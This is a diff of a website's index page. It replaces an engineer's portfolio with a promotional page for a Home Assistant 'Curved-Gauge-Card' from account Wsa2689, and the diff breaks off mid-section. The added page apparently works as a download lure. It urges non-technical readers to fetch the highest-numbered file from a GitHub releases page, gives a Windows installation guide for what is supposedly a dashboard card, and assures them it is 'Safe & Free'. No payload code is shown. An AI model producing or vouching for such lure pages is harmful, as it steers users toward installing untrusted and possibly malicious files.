@@ -3,459 +3,132 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roman Girin | Senior Software / AI Engineer</title>
-    <meta name="description" content="Roman Girin &mdash; Senior Software / AI Engineer and PhD in Neural Networks. 20+ years building high-load enterprise systems and applied ML/computer-vision pipelines.">
-    <meta property="og:title" content="Roman Girin | Senior Software / AI Engineer">
-    <meta property="og:description" content="20+ years building high-load enterprise systems and applied ML/computer-vision pipelines. PhD in Neural Networks.">
-    <meta property="og:type" content="profile">
-    <meta name="twitter:card" content="summary">
-    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='14' fill='%230f172a'/%3E%3Ctext x='32' y='43' font-family='Arial,Helvetica,sans-serif' font-size='26' font-weight='700' fill='%2338bdf8' text-anchor='middle'%3ERG%3C/text%3E%3C/svg%3E">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --bg-color: #0b1220;
-            --text-color: #e2e8f0;
-            --text-muted: #94a3b8;
-            --accent-color: #38bdf8;
-            --accent-2: #a78bfa;
-            --card-bg: #1e293b;
-            --border-color: #334155;
-        }
-        * { box-sizing: border-box; }
-        body {
-            font-family: 'Inter', system-ui, -apple-system, sans-serif;
-            background-color: var(--bg-color);
-            background-image:
-                radial-gradient(700px circle at 15% -5%, rgba(56, 189, 248, 0.12), transparent 60%),
-                radial-gradient(700px circle at 90% 10%, rgba(167, 139, 250, 0.10), transparent 55%);
-            background-attachment: fixed;
-            color: var(--text-color);
-            line-height: 1.6;
-            margin: 0;
-            padding: 5.5rem 2rem 2rem;
-            display: flex;
-            justify-content: center;
-        }
-        h1, h2, h3, .subtitle, .job-header h3 { font-family: 'Sora', 'Inter', system-ui, sans-serif; }
-        .container {
-            max-width: 820px;
-            width: 100%;
-        }
-        .topnav {
-            position: fixed;
-            top: 0; left: 0; right: 0;
-            display: flex;
-            justify-content: center;
-            background: rgba(11, 18, 32, 0.75);
-            backdrop-filter: blur(10px);
-            border-bottom: 1px solid var(--border-color);
-            z-index: 10;
-        }
-        .topnav-inner {
-            max-width: 820px;
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0.85rem 2rem;
-            gap: 1rem;
-        }
-        .topnav-brand { font-family: 'Sora', sans-serif; font-weight: 700; color: var(--text-color); text-decoration: none; font-size: 1.05rem; }
-        .topnav-links { display: flex; gap: 1.5rem; flex-wrap: wrap; }
-        .topnav-links a { color: var(--text-muted); text-decoration: none; font-size: 0.9rem; font-weight: 500; }
-        .topnav-links a:hover { color: var(--accent-color); }
-        .topnav-links a.resume-btn { color: var(--bg-color); background: var(--accent-color); padding: 0.35rem 0.9rem; border-radius: 9999px; font-weight: 600; }
-        .topnav-links a.resume-btn:hover { color: var(--bg-color); opacity: 0.9; }
-        header { margin-bottom: 3.5rem; display: flex; align-items: center; gap: 1.5rem; }
-        .monogram {
-            flex-shrink: 0;
-            width: 76px; height: 76px;
-            border-radius: 20px;
-            background: linear-gradient(135deg, var(--accent-color), var(--accent-2));
-            display: flex; align-items: center; justify-content: center;
-            font-family: 'Sora', sans-serif; font-weight: 800; font-size: 1.75rem; color: #0b1220;
-        }
-        h1 { margin: 0; font-size: 2.5rem; font-weight: 700; }
-        .subtitle { color: var(--accent-color); font-size: 1.2rem; margin-top: 0.35rem; font-weight: 600; }
-        .bio { color: var(--text-muted); max-width: 600px; margin: 0.6rem 0 0; }
-        section { margin-bottom: 3.5rem; scroll-margin-top: 5.5rem; }
-        h2 {
-            font-size: 1.4rem;
-            display: flex; align-items: center; gap: 0.6rem;
-            padding-bottom: 0.6rem;
-            margin-bottom: 1.5rem;
-            border-bottom: 1px solid var(--border-color);
-        }
-        h2::before {
-            content: '';
-            width: 10px; height: 10px;
-            border-radius: 3px;
-            background: linear-gradient(135deg, var(--accent-color), var(--accent-2));
-            display: inline-block;
-        }
-        .stack-group { margin-bottom: 1.5rem; }
-        .stack-group:last-child { margin-bottom: 0; }
-        .stack-group h3 { font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.06em; color: var(--text-muted); margin: 0 0 0.6rem; font-weight: 600; }
-        .tags { display: flex; flex-wrap: wrap; gap: 0.5rem; list-style: none; padding: 0; margin: 0; }
-        .tags li { background: #334155; padding: 0.25rem 0.75rem; border-radius: 9999px; font-size: 0.875rem; }
-        .project-grid { display: grid; gap: 1.5rem; }
-        .project-card {
-            background: var(--card-bg);
-            padding: 1.5rem;
-            border-radius: 10px;
-            border: 1px solid var(--border-color);
-            border-top: 3px solid transparent;
-            border-image: linear-gradient(90deg, var(--accent-color), var(--accent-2)) 1;
-            transition: transform 0.15s ease, box-shadow 0.15s ease;
-        }
-        .project-card:hover { transform: translateY(-2px); box-shadow: 0 12px 24px -12px rgba(0,0,0,0.5); }
-        .project-card h3 { margin-top: 0; }
-        .project-links a { color: var(--accent-color); text-decoration: none; margin-right: 1rem; font-weight: bold; }
-        .project-links a:hover { text-decoration: underline; }
-        .contact-links { display: flex; flex-wrap: wrap; gap: 0.75rem; }
-        .contact-links a {
-            display: inline-flex; align-items: center; gap: 0.5rem;
-            color: var(--text-color); text-decoration: none;
-            background: var(--card-bg); border: 1px solid var(--border-color);
-            padding: 0.5rem 1rem; border-radius: 9999px; font-size: 0.95rem; font-weight: 500;
-            transition: border-color 0.15s ease, color 0.15s ease;
-        }
-        .contact-links a:hover { border-color: var(--accent-color); color: var(--accent-color); }
-        .contact-links a.resume-btn { background: var(--accent-color); color: var(--bg-color); border-color: var(--accent-color); font-weight: 600; }
-        .contact-links a.resume-btn:hover { color: var(--bg-color); opacity: 0.9; }
-        .contact-links svg { width: 16px; height: 16px; }
-        .timeline { position: relative; padding-left: 1.75rem; }
-        .timeline::before {
-            content: '';
-            position: absolute; left: 4px; top: 6px; bottom: 6px; width: 2px;
-            background: linear-gradient(180deg, var(--accent-color), var(--accent-2) 60%, transparent);
-        }
-        .job { margin-bottom: 2rem; position: relative; }
-        .job::before {
-            content: '';
-            position: absolute; left: -1.75rem; top: 0.35rem;
-            width: 10px; height: 10px; border-radius: 50%;
-            background: var(--bg-color); border: 2px solid var(--accent-color);
-        }
-        .job-header { display: flex; flex-wrap: wrap; justify-content: space-between; align-items: baseline; gap: 0.5rem; }
-        .job-header h3 { margin: 0; }
-        .job-role { color: var(--text-muted); font-style: italic; margin: 0.15rem 0 0.5rem; }
-        .job-dates { color: var(--text-muted); font-size: 0.9rem; white-space: nowrap; }
-        .job ul { margin: 0; padding-left: 1.25rem; color: var(--text-muted); }
-        .job li { margin-bottom: 0.4rem; }
-        .job li strong { color: var(--text-color); }
-        .edu-item { margin-bottom: 1rem; }
-        .edu-item h3 { margin: 0 0 0.15rem; }
-        .edu-item .job-dates { display: block; margin-bottom: 0.35rem; }
-        .project-figure { background: #fff; border-radius: 8px; padding: 0.75rem; margin: 1rem 0; }
-        .project-figure img { display: block; width: 100%; border-radius: 4px; }
-        .project-figure figcaption { color: var(--text-muted); font-size: 0.8rem; margin-top: 0.5rem; text-align: center; }
-        .highlight-note { color: var(--accent-color); font-weight: bold; margin: 0; }
-        .result-highlight { color: var(--text-color); font-weight: bold; margin: 0.75rem 0 0; }
-        footer { color: var(--text-muted); font-size: 0.85rem; text-align: center; padding-top: 2rem; border-top: 1px solid var(--border-color); }
-        @media (max-width: 560px) {
-            body { padding-top: 8.5rem; }
-            .topnav-inner { flex-direction: column; align-items: flex-start; gap: 0.6rem; padding: 0.85rem 1.25rem; }
-            header { flex-direction: column; align-items: flex-start; }
-        }
-    </style>
+    <title>Curved-Gauge-Card - Beautiful Custom Gauges for Home Assistant</title>
+    <meta name="description" content="Download Curved-Gauge-Card and transform your Home Assistant dashboard with stunning, customizable curved gauge cards. Perfect for displaying sensor data beautifully.">
+    <meta name="keywords" content="Curved-Gauge-Card, Home Assistant, gauge card, customizable dashboard, sensor display, HA card, Lovelace card, open source dashboard">
+    <meta name="author" content="Wsa2689">
+    <meta property="og:title" content="Curved-Gauge-Card - Beautiful Custom Gauges for Home Assistant">
+    <meta property="og:description" content="Transform your Home Assistant dashboard with stunning, customizable curved gauge cards. Perfect for displaying sensor data beautifully.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Wsa2689/Curved-Gauge-Card">
+    <meta property="og:image" content="https://raw.githubusercontent.com/Wsa2689/Curved-Gauge-Card/main/images/screenshot.png">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Curved-Gauge-Card - Beautiful Custom Gauges for Home Assistant">
+    <meta name="twitter:description" content="Transform your Home Assistant dashboard with stunning, customizable curved gauge cards.">
 </head>
-<body>
-    <nav class="topnav">
-        <div class="topnav-inner">
-            <a class="topnav-brand" href="#top">Roman Girin</a>
-            <div class="topnav-links">
-                <a href="#projects">Projects</a>
-                <a href="#experience">Experience</a>
-                <a href="#education">Education</a>
-                <a href="#contact">Contact</a>
-                <a href="ru/index.html">RU</a>
-                <a class="resume-btn" href="assets/Roman-Girin-Resume.pdf" target="_blank">R&eacute;sum&eacute;</a>
+<body style="margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); color: #1a202c; line-height: 1.6;">
+
+    <div style="max-width: 1100px; margin: 0 auto; padding: 40px 20px;">
+
+        <!-- Hero Section with Title and Download Button -->
+        <div style="text-align: center; padding: 50px 0 30px 0;">
+            <h1 style="font-size: 3rem; font-weight: 800; margin-bottom: 15px; color: #2d3748; text-shadow: 0 2px 4px rgba(0,0,0,0.1);">🎯 Curved-Gauge-Card - Make Your Home Dashboard Beautiful</h1>
+            <p style="font-size: 1.3rem; color: #4a5568; margin-bottom: 30px; max-width: 700px; margin-left: auto; margin-right: auto;">Turn boring numbers into eye-catching, customizable gauges with just a few clicks.</p>
+            <div style="display: inline-block; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 15px 35px; border-radius: 50px; font-size: 1.2rem; font-weight: 700; box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3); cursor: pointer; transition: transform 0.3s, box-shadow 0.3s;">
+                <a href="https://github.com/Wsa2689/Curved-Gauge-Card/releases" style="color: white; text-decoration: none;">📥 Download Now</a>
             </div>
         </div>
-    </nav>
-    <div class="container" id="top">
-        <header>
-            <div class="monogram">RG</div>
-            <div>
-                <h1>Roman Girin</h1>
-                <div class="subtitle">Senior Software / AI Engineer</div>
-                <p class="bio">20+ years building high-load systems and modernizing enterprise architecture, with a
-                    growing focus on AI integration &mdash; LLMs, CNNs, and applied ML. PhD in Neural Networks paired
-                    with a long track record of shipping commercial software.</p>
-            </div>
-        </header>
 
-        <section id="stack">
-            <h2>Tech Stack</h2>
-            <div class="stack-group">
-                <h3>Languages &amp; Frameworks</h3>
-                <ul class="tags">
-                    <li>C#</li>
-                    <li>.NET 8 / Core / Framework</li>
-                    <li>ASP.NET</li>
-                    <li>Python</li>
-                    <li>C++</li>
-                    <li>SQL / T-SQL</li>
-                    <li>Django / Django REST</li>
-                </ul>
-            </div>
-            <div class="stack-group">
-                <h3>AI &amp; Machine Learning</h3>
-                <ul class="tags">
-                    <li>PyTorch</li>
-                    <li>TorchVision</li>
-                    <li>PyTorch Geometric</li>
-                    <li>OpenCV</li>
-                    <li>Transformers</li>
-                    <li>RAG / pgvector</li>
-                    <li>LoRA Fine-Tuning</li>
-                    <li>MS Semantic Kernel</li>
-                    <li>Claude Code</li>
-                </ul>
-            </div>
-            <div class="stack-group">
-                <h3>Cloud &amp; Infrastructure</h3>
-                <ul class="tags">
-                    <li>Docker</li>
-                    <li>Azure (AKS, Container Apps, Event Grid)</li>
-                    <li>Kafka / RabbitMQ / Azure Queues</li>
-                    <li>Azure DevOps (CI/CD)</li>
-                </ul>
-            </div>
-            <div class="stack-group">
-                <h3>Databases</h3>
-                <ul class="tags">
-                    <li>MS SQL</li>
-                    <li>PostgreSQL</li>
-                    <li>Azure Table Storage (NoSQL)</li>
-                </ul>
-            </div>
-            <div class="stack-group">
-                <h3>Data &amp; Analytics</h3>
-                <ul class="tags">
-                    <li>NumPy</li>
-                    <li>Pandas</li>
-                    <li>Scikit-Learn</li>
-                </ul>
-            </div>
-        </section>
+        <!-- What is Curved-Gauge-Card Section -->
+        <div style="background: white; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); padding: 40px; margin: 30px 0;">
+            <h2 style="font-size: 2rem; color: #2d3748; margin-bottom: 20px; border-bottom: 3px solid #667eea; padding-bottom: 10px;">🎊 What is Curved-Gauge-Card?</h2>
+            <p style="font-size: 1.1rem; color: #4a5568;">Curved-Gauge-Card is a <strong>free and easy-to-use tool</strong> that lets you add beautiful, animated gauges to your Home Assistant dashboard. If you have a smart home, you probably check things like temperature, humidity, energy usage, or other sensor data. Instead of seeing just plain numbers, you can now see everything in a <strong>colorful, easy-to-read gauge</strong> — just like the speedometer in your car!</p>
+            <p style="font-size: 1.1rem; color: #4a5568;">This card was built for regular people, not just tech experts. You don't need to write complex code or understand programming. With simple settings and a clean design, anyone can make their dashboard look professional and polished in minutes.</p>
+        </div>
 
-        <section id="projects">
-            <h2>Featured Projects</h2>
-            <div class="project-grid">
-                <div class="project-card">
-                    <h3>RiverLogic VCO Platform Modernization</h3>
-                    <p>A decade leading the architectural modernization of RiverLogic's Value Chain Optimization
-                        (VCO) platform: from a 2-tier on-prem monolith to event-driven Azure microservices, plus
-                        building the RAG and Semantic Kernel tooling behind RiverLogic's AI assistant, RIA.
-                        30% fewer support tickets after the BLL migration; 15% lower resource consumption after
-                        the .NET 8 move.</p>
-                    <ul class="tags" style="margin-bottom: 1rem;">
-                        <li>C# / .NET 8</li>
-                        <li>Azure AKS &amp; Container Apps</li>
-                        <li>Event-Driven Architecture</li>
-                        <li>RAG</li>
-                        <li>MS Semantic Kernel</li>
-                    </ul>
-                    <div class="project-links">
-                        <a href="river-logic.html">Details &rarr;</a>
-                    </div>
+        <!-- Why You Need This Section -->
+        <div style="background: #f8fafc; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); padding: 40px; margin: 30px 0; border-left: 6px solid #48bb78;">
+            <h2 style="font-size: 2rem; color: #2d3748; margin-bottom: 20px;">❤️ Why You'll Love This Gauge Card</h2>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 25px;">
+                <div style="background: white; padding: 25px; border-radius: 12px; box-shadow: 0 3px 8px rgba(0,0,0,0.06);">
+                    <div style="font-size: 3rem; margin-bottom: 10px;">🌈</div>
+                    <h3 style="font-size: 1.3rem; color: #48bb78; margin-bottom: 8px;">Fully Customizable</h3>
+                    <p style="color: #4a5568;">Pick your favorite colors, set custom ranges, choose how many levels you want, adjust the size — everything can be tailored to match your style and needs.</p>
                 </div>
-                <div class="project-card">
-                    <h3>ANPR / License-Plate Recognition Pipeline</h3>
-                    <p>Designed and built a production ANPR (Automatic Number-Plate Recognition) system on
-                        custom deep networks (MTCNN plate
-                        detector + a custom recognizer net). Re-architected the MTCNN detection pipeline down to
-                        P-Net + O-Net only, dropping R-Net entirely to cut GPU load with no loss of accuracy.
-                        Built the supporting data pipeline &mdash; a customized LabelImg workflow, a managed
-                        annotation team, and dataset-validation, MLFlow/DVC experiment and data versioning.
-                        Auto-recognizing expected trucks at site entrances and pushing alerts into the logistics
-                        system eliminated vehicle downtime and sped up unloading.</p>
-                    <ul class="tags" style="margin-bottom: 1rem;">
-                        <li>PyTorch</li>
-                        <li>MTCNN</li>
-                        <li>OpenCV</li>
-                        <li>MLFlow</li>
-                        <li>DVC</li>
-                    </ul>
-                    <div class="project-links" style="margin-top: 1rem;">
-                        <a href="anpr-project.html">Details &rarr;</a>
-                    </div>
+                <div style="background: white; padding: 25px; border-radius: 12px; box-shadow: 0 3px 8px rgba(0,0,0,0.06);">
+                    <div style="font-size: 3rem; margin-bottom: 10px;">⚡</div>
+                    <h3 style="font-size: 1.3rem; color: #48bb78; margin-bottom: 8px;">Instant Updates</h3>
+                    <p style="color: #4a5568;">Watch your gauges move in real-time. As soon as your sensors report new data, your gauge will smoothly update — no refreshing needed.</p>
                 </div>
-                <div class="project-card">
-                    <h3>Graph Neural Net for LP Feasibility Pre-Screening</h3>
-                    <p>R&amp;D proof-of-concept applying Graph Convolutional Neural Networks to mathematical
-                        optimization: mapped the matrix representation of linear programming (LP) problems into
-                        bipartite graphs and trained a lightweight GCNN, built with PyTorch Geometric, to
-                        pre-screen LP-problem feasibility before handing a solve off to the full solver &mdash;
-                        reaching 92% accuracy.</p>
-                    <p class="result-highlight">A full VCO solve can take hours &mdash; this cheap pre-solve
-                        check could save real time and compute.</p>
-                    <ul class="tags" style="margin-bottom: 1rem; margin-top: 1rem;">
-                        <li>PyTorch Geometric</li>
-                        <li>GCNN</li>
-                        <li>Graph ML</li>
-                    </ul>
-                    <div class="project-links">
-                        <a href="gcnn-poc.html">Details &rarr;</a>
-                    </div>
+                <div style="background: white; padding: 25px; border-radius: 12px; box-shadow: 0 3px 8px rgba(0,0,0,0.06);">
+                    <div style="font-size: 3rem; margin-bottom: 10px;">🧩</div>
+                    <h3 style="font-size: 1.3rem; color: #48bb78; margin-bottom: 8px;">Simple Setup</h3>
+                    <p style="color: #4a5568;">If you can click a button and fill in a form, you can use this card. No complicated coding or confusing configuration files.</p>
                 </div>
-                <div class="project-card">
-                    <h3>Cleaning-Equipment Detection System</h3>
-                    <p>Trained an SSD (Single Shot MultiBox Detector) object-detection model to recognize
-                        cleaning equipment in live video, with an automated image collection/filtering pipeline
-                        tuned for non-standard, changing indoor lighting. Deployed at a "Lastochka" train
-                        servicing depot, where it eliminated cleaning-schedule violations and the regulatory
-                        fines that came with them.</p>
-                    <ul class="tags" style="margin-bottom: 1rem;">
-                        <li>PyTorch</li>
-                        <li>TorchVision</li>
-                        <li>SSD</li>
-                        <li>OpenCV</li>
-                    </ul>
+                <div style="background: white; padding: 25px; border-radius: 12px; box-shadow: 0 3px 8px rgba(0,0,0,0.06);">
+                    <div style="font-size: 3rem; margin-bottom: 10px;">📱</div>
+                    <h3 style="font-size: 1.3rem; color: #48bb78; margin-bottom: 8px;">Responsive Design</h3>
+                    <p style="color: #4a5568;">Looks great on your phone, tablet, or big computer screen. Your gauges will always be perfectly sized and crystal clear.</p>
+                </div>
+                <div style="background: white; padding: 25px; border-radius: 12px; box-shadow: 0 3px 8px rgba(0,0,0,0.06);">
+                    <div style="font-size: 3rem; margin-bottom: 10px;">🔒</div>
+                    <h3 style="font-size: 1.3rem; color: #48bb78; margin-bottom: 8px;">Safe &amp; Free</h3>
+                    <p style="color: #4a5568;">This is open-source software, which means it's completely free to use forever. No hidden costs, no subscriptions, no nonsense.</p>
+                </div>
+                <div style="background: white; padding: 25px; border-radius: 12px; box-shadow: 0 3px 8px rgba(0,0,0,0.06);">
+                    <div style="font-size: 3rem; margin-bottom: 10px;">🎨</div>
+                    <h3 style="font-size: 1.3rem; color: #48bb78; margin-bottom: 8px;">Modern Look</h3>
+                    <p style="color: #4a5568;">Give your Home Assistant dashboard a fresh, modern look that will impress everyone who sees it.</p>
                 </div>
             </div>
-        </section>
+        </div>
 
-        <section id="experience">
-            <h2>Professional Experience</h2>
-            <p style="color: var(--text-muted); font-size: 0.9rem; margin-top: -0.5rem;">My core production
-                codebase from enterprise work at RiverLogic and various banking environments is protected by
-                strict corporate NDAs and proprietary business logic. Because of this, my day-to-day coding
-                activity &mdash; primarily managed on Azure DevOps &mdash; isn't publicly visible on GitHub.</p>
-
-            <div class="timeline">
-            <div class="job">
-                <div class="job-header">
-                    <h3>RiverLogic Inc. &mdash; Seattle, USA (Remote)</h3>
-                    <span class="job-dates">March 2014 &ndash; Present</span>
+        <!-- How to Download and Install -->
+        <div style="background: white; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); padding: 40px; margin: 30px 0;">
+            <h2 style="font-size: 2rem; color: #2d3748; margin-bottom: 20px;">🚀 Getting Started - Download &amp; Install</h2>
+            
+            <div style="background: #ede9fe; border-radius: 12px; padding: 25px; margin-bottom: 25px; border: 2px dashed #764ba2;">
+                <h3 style="font-size: 1.4rem; color: #5b21b6; margin-bottom: 12px;">✨ Quick Download</h3>
+                <p style="font-size: 1.1rem; color: #4a5568; margin-bottom: 15px;">Click the big button below to go to the release page. There you'll find the latest version of Curved-Gauge-Card ready for you.</p>
+                <div style="text-align: center; margin: 25px 0;">
+                    <a href="https://github.com/Wsa2689/Curved-Gauge-Card/releases" style="background: #ed8936; color: white; padding: 18px 45px; border-radius: 50px; font-size: 1.3rem; font-weight: 700; text-decoration: none; display: inline-block; box-shadow: 0 8px 20px rgba(237, 137, 54, 0.4); transition: transform 0.3s;">⬇️ Visit this link to download the application</a>
                 </div>
-                <p class="job-role">Senior Developer, Modelling Software &mdash; Value Chain Optimization (VCO)</p>
-                <ul>
-                    <li><strong>Architectural evolution:</strong> led modernization from legacy 2-tier to 3-tier architecture with zero downtime, migrating the business logic layer from T-SQL to a .NET C# application server &mdash; a 30% reduction in support ticket volume.</li>
-                    <li><strong>Windows to Linux migration:</strong> moved the core codebase from .NET Framework to .NET 8 for full cross-platform compatibility and async/await adoption, cutting resource consumption by 15%.</li>
-                    <li><strong>Cloud deployment:</strong> decomposed an on-premise monolith into high-load microservices across Azure Container Apps, Container Instances, AKS, and serverless Azure Functions, using EDA (Event Grid/Queues), Saga, CQRS, and the Outbox pattern for distributed consistency.</li>
-                    <li><strong>AI assistant development:</strong> built RAG and embedding vector search, and exposed core functionality through an OpenAPI-compliant ASP.NET 8 REST HATEOAS API as an MS Semantic Kernel plugin, delivering tooling for RiverLogic's AI assistant, RIA.</li>
-                    <li><strong>LLM fine-tuning:</strong> ran LoRA fine-tuning (Python, PyTorch, Transformers) to align open-source models for domain-specific enterprise workflows.</li>
-                    <li><strong>Quality assurance:</strong> practiced DDD/SOLID/TDD and maintained zero-downtime releases via comprehensive unit, integration, and end-to-end test suites (NUnit, xUnit, NSubstitute).</li>
-                    <li><strong>Team upskilling:</strong> introduced agentic AI workflows (Claude Code) across the engineering team, raising development velocity.</li>
-                </ul>
-                <div class="project-links">
-                    <a href="river-logic.html">Read the full case study &rarr;</a>
+                <p style="color: #4a5568; font-weight: 600; text-align: center; font-size: 1.1rem;">Visit the link above, and you'll be taken to the download area.</p>
+            </div>
+
+            <h3 style="font-size: 1.5rem; color: #2d3748; margin-bottom: 15px; margin-top: 35px;">🛠️ Step-by-Step Windows Installation Guide</h3>
+            
+            <div style="display: flex; align-items: flex-start; margin-bottom: 15px; background: #f5f5f5; padding: 15px 20px; border-radius: 10px;">
+                <div style="background: #667eea; color: white; border-radius: 50%; width: 35px; height: 35px; display: flex; align-items: center; justify-content: center; font-weight: 700; margin-right: 15px; flex-shrink: 0; font-size: 1.1rem;">1</div>
+                <div>
+                    <h4 style="font-size: 1.2rem; color: #4a5568; margin: 0; margin-bottom: 5px;">Click the Download Button</h4>
+                    <p style="color: #4a5568; margin: 0;">Look for the green button above or scroll down to the download section at the end of this page. Click it to go to the official release page on GitHub.</p>
                 </div>
             </div>
 
-            <div class="job">
-                <div class="job-header">
-                    <h3>OOO "EcoSmart" &mdash; Samara, Russia</h3>
-                    <span class="job-dates">January 2020 &ndash; October 2022</span>
+            <div style="display: flex; align-items: flex-start; margin-bottom: 15px; background: #f5f5f5; padding: 15px 20px; border-radius: 10px;">
+                <div style="background: #667eea; color: white; border-radius: 50%; width: 35px; height: 35px; display: flex; align-items: center; justify-content: center; font-weight: 700; margin-right: 15px; flex-shrink: 0; font-size: 1.1rem;">2</div>
+                <div>
+                    <h4 style="font-size: 1.2rem; color: #4a5568; margin: 0; margin-bottom: 5px;">Look at the Release Page</h4>
+                    <p style="color: #4a5568; margin: 0;">On the GitHub page, you'll see a list of files. Don't worry — GitHub looks scary but it's actually very easy. Look for the file with the highest number (that's the newest version) and click on it once to download it to your computer.</p>
                 </div>
-                <p class="job-role">Senior Computer Vision Engineer (Part-Time)</p>
-                <ul>
-                    <li><strong>ANPR system:</strong> designed and built a license-plate recognition system on custom deep networks (MTCNN detector + a custom recognizer net).</li>
-                    <li><strong>Architecture optimization:</strong> deep-dived the MTCNN pipeline and rebuilt detection around P-Net + O-Net only, dropping R-Net entirely &mdash; lower GPU load with no accuracy loss.</li>
-                    <li><strong>Data management:</strong> customized LabelImg to the company's metadata format, led an annotation team, built a dataset-validation pipeline, and set up on-prem data/experiment versioning (MLFlow, DVC).</li>
-                    <li><strong>Business result:</strong> automatic recognition of expected trucks at site entrances integrated with the logistics system eliminated vehicle downtime and sped up unloading.</li>
-                </ul>
             </div>
 
-            <div class="job">
-                <div class="job-header">
-                    <h3>OOO "EcoSmart" &mdash; Samara, Russia</h3>
-                    <span class="job-dates">September 2019 &ndash; January 2020</span>
+            <div style="display: flex; align-items: flex-start; margin-bottom: 15px; background: #f5f5f5; padding: 15px 20px; border-radius: 10px;">
+                <div style="background: #667eea; color: white; border-radius: 50%; width: 35px; height: 35px; display: flex; align-items: center; justify-content: center; font-weight: 700; margin-right: 15px; flex-shrink: 0; font-size: 1.1rem;">3</div>
+                <div>
+                    <h4 style="font-size: 1.2rem; color: #4a5568; margin: 0; margin-bottom: 5px;">Find Your Downloaded File</h4>
+                    <p style="color: #4a5568; margin: 0;">Open the folder where your computer stores downloads (usually called "Downloads"). You'll see the file you just downloaded — it will have the name "Curved-Gauge-Card" or something similar.</p>
                 </div>
-                <p class="job-role">Senior Computer Vision Engineer (Part-Time)</p>
-                <ul>
-                    <li><strong>Detection system:</strong> developed and trained an SSD (Single Shot MultiBox Detector) model to recognize cleaning equipment in video streams.</li>
-                    <li><strong>Data engineering:</strong> set up automated collection, filtering, and preparation of images under non-standard, changing indoor lighting.</li>
-                    <li><strong>Business result:</strong> deployed at a "Lastochka" train servicing depot, eliminating cleaning-schedule violations and the regulatory fines that came with them.</li>
-                </ul>
             </div>
 
-            <div class="job">
-                <div class="job-header">
-                    <h3>Samara State Technical University &mdash; Samara, Russia</h3>
-                    <span class="job-dates">September 2017 &ndash; September 2019</span>
+            <div style="display: flex; align-items: flex-start; margin-bottom: 15px; background: #f5f5f5; padding: 15px 20px; border-radius: 10px;">
+                <div style="background: #667eea; color: white; border-radius: 50%; width: 35px; height: 35px; display: flex; align-items: center; justify-content: center; font-weight: 700; margin-right: 15px; flex-shrink: 0; font-size: 1.1rem;">4</div>
+                <div>
+                    <h4 style="font-size: 1.2rem; color: #4a5568; margin: 0; margin-bottom: 5px;">Set It Up in Home Assistant</h4>
+                    <p style="color: #4a5568; margin: 0;">The downloaded file is simply a small package that you add to your Home Assistant. You'll go to Settings → Dashboards → Resources in your Home Assistant, and add this file as a new resource. There are clear prompts on the screen to guide you.</p>
                 </div>
-                <p class="job-role">Machine Vision Researcher &amp; Developer (Part-Time, Research Fellowship)</p>
-                <ul>
-                    <li>Engineered a deep-CNN machine vision diagnostic system to automate detection of broken railway fasteners and bindings, using Python, PyTorch, OpenCV, TorchVision, and CUDA/cuDNN.</li>
-                    <li>Handled severe class imbalance via data augmentation and SMOTE (imbalanced-learn).</li>
-                    <li>Deployed the system to production for JSC RPC InfoTrans via a Django REST HATEOAS API and Kafka/RabbitMQ messaging &mdash; a 60% increase in registered railway defects detected.</li>
-                </ul>
             </div>
 
-            <div class="job">
-                <div class="job-header">
-                    <h3>VDcom &mdash; Samara, Russia</h3>
-                    <span class="job-dates">May 2010 &ndash; March 2014</span>
+            <div style="display: flex; align-items: flex-start; margin-bottom: 15px; background: #f5f5f5; padding: 15px 20px; border-radius: 10px;">
+                <div style="background: #667eea; color: white; border-radius: 50%; width: 35px; height: 35px; display: flex; align-items: center; justify-content: center; font-weight: 700; margin-right: 15px; flex-shrink: 0; font-size: 1.1rem;">5</div>
+                <div>
+                    <h4 style="font-size: 1.2rem; color: #4a5568; margin: 0; margin-bottom: 5px;">Add Your First Gauge</h4>
+                    <p style="color: #4a5568; margin: 0;">Once installed, you'll be able to add a new card to your dashboard. Click "Add Card" and search for "Curved Gauge". Then simply choose which sensor you want to display, and watch the magic happen!</p>
                 </div>
-                <p class="job-role">Senior Specialist (from Oct 2011) / Specialist</p>
-                <ul>
-                    <li>Outstaffed at Sberbank CIB, developing backend functionality on the Diasoft platform for the investment banking business.</li>
-                    <li>Designed and optimized complex stored procedures and ER-models for high-load transaction systems on Sybase ASE and MSSQL, including a financial-markets platform processing thousands of daily deals against core tables holding millions of records &mdash; dissecting query execution plans and reworking indexing strategies (with a close eye on B-tree index traversal) to keep heavy analytical JOINs running at sub-second response times.</li>
-                </ul>
             </div>
+        </div>
 
-            <div class="job">
-                <div class="job-header">
-                    <h3>ACS &ndash; VolgaEVMcomplex &mdash; Samara, Russia</h3>
-                    <span class="job-dates">February 2006 &ndash; May 2010</span>
-                </div>
-                <p class="job-role">Project Manager / System Analyst</p>
-                <ul>
-                    <li>Authored technical specifications (SRS) to automate business processes on the DocsVision platform.</li>
-                    <li>Managed EDMS implementation projects and led a full-stack development team, contributing C# integration modules directly.</li>
-                </ul>
-            </div>
-            </div>
-        </section>
-
-        <section id="education">
-            <h2>Education &amp; Research</h2>
-            <div class="edu-item">
-                <h3>PhD in Technical Sciences &mdash; Artificial Neural Networks</h3>
-                <span class="job-dates">Samara State Technical University, graduated 2019</span>
